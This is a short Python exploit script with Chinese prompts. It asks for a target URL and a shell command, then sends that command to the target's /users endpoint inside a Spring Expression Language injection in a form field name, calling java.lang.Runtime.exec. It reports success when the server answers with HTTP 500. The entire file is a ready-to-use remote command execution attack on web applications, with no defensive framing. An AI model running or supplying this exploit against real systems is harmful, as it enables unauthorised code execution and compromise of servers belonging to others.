#!/usr/bin/env python
# coding:utf-8
# auther:xiaoZ

import requests

target = input("请输入目标URL：")
shell = input("请输入需要执行的命令：")

tmp = 'username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("'+ shell +'")]'
data = {tmp:'1', 'password':'2', 'repeatedPassword':'3'}

headers = {'Content-Type':'application/x-www-form-urlencoded'}

url = target + "/users?page=&size=5"
rep = requests.post(url=url, data=data, headers=headers)

if rep.status_code == 500:
	print('exec shell success!')
